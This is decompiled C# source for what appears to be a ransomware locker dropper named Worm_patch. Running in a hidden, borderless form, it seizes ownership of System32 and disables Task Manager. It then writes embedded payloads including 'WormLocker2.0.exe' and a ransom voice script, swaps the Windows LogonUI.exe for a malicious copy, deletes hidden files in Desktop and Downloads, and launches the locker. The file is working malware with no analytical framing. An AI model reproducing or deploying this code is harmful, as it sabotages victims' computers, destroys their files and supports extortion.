using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Windows.Forms;
using Microsoft.Win32;

namespace SysWOW64;

public class Worm_patch : Form
{
	private IContainer components = null;

	private Timer cmd_get;

	private Timer tmr_start_worm;

	public Worm_patch()
	{
		InitializeComponent();
		((Form)this).set_TransparencyKey(((Control)this).get_BackColor());
		((Form)this).set_TopMost(true);
		((Form)this).set_Opacity(1.0);
		Process.Start(new ProcessStartInfo
		{
			FileName = "cmd.exe",
			WindowStyle = ProcessWindowStyle.Hidden,
			Arguments = "/k takeown /f C:\\Windows\\System32 && icacls C:\\Windows\\System32 /grant \"%username%:F\""
		});
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		registryKey.SetValue("DisableTaskMgr", 1, RegistryValueKind.String);
	}

	private void Worm_patch_Load(object sender, EventArgs e)
	{
		cmd_get.Start();
		tmr_start_worm.Start();
	}

	public static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
	{
		Assembly callingAssembly = Assembly.GetCallingAssembly();
		using Stream stream = callingAssembly.GetManifestResourceStream(nameSpace + "." + ((internalFilePath == "") ? "" : (internalFilePath + ".")) + resourceName);
		using BinaryReader binaryReader = new BinaryReader(stream);
		using FileStream output = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate);
		using BinaryWriter binaryWriter = new BinaryWriter(output);
		binaryWriter.Write(binaryReader.ReadBytes((int)stream.Length));
	}

	private void cmd_get_Tick(object sender, EventArgs e)
	{
		cmd_get.Stop();
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		string text2 = text;
		Extract("SysWOW64", "C:\\Windows\\System32", "Script", "LogonUIinf.exe");
		Extract("SysWOW64", "C:\\Windows\\System32", "Script", "ransom_voice.vbs");
		Extract("SysWOW64", "C:\\Windows\\System32", "Script", "WormLocker2.0.exe");
		File.Copy("C:\\Windows\\System32\\LogonUI.exe", "C:\\Windows\\System32\\LogonUItrue.exe");
		File.Delete("C:\\Windows\\System32\\LogonUI.exe");
		File.Copy("C:\\Windows\\System32\\LogonUIinf.exe", "C:\\Windows\\System32\\LogonUI.exe");
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string[] array = (from f in Directory.EnumerateFiles(folderPath + "\\")
			where (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden
			select f).ToArray();
		string[] array2 = array;
		foreach (string path in array2)
		{
			File.Delete(path);
		}
		string text3 = text2;
		string[] array3 = (from f in Directory.EnumerateFiles(text3 + "\\")
			where (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden
			select f).ToArray();
		string[] array4 = array3;
		foreach (string path2 in array4)
		{
			File.Delete(path2);
		}
	}

	private void tmr_start_worm_Tick(object sender, EventArgs e)
	{
		tmr_start_worm.Stop();
		Process.Start("C:\\Windows\\System32\\WormLocker2.0.exe");
		((Form)this).Close();
		Application.Exit();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		components = new Container();
		cmd_get = new Timer(components);
		tmr_start_worm = new Timer(components);
		((Control)this).SuspendLayout();
		cmd_get.set_Enabled(true);
		cmd_get.set_Interval(10000);
		cmd_get.add_Tick((EventHandler)cmd_get_Tick);
		tmr_start_worm.set_Enabled(true);
		tmr_start_worm.set_Interval(15000);
		tmr_start_worm.add_Tick((EventHandler)tmr_start_worm_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(50, 50));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Worm_patch");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("ff0953qpn7361bbu");
		((Form)this).set_TopMost(true);
		((Form)this).add_Load((EventHandler)Worm_patch_Load);
		((Control)this).ResumeLayout(false);
	}
}
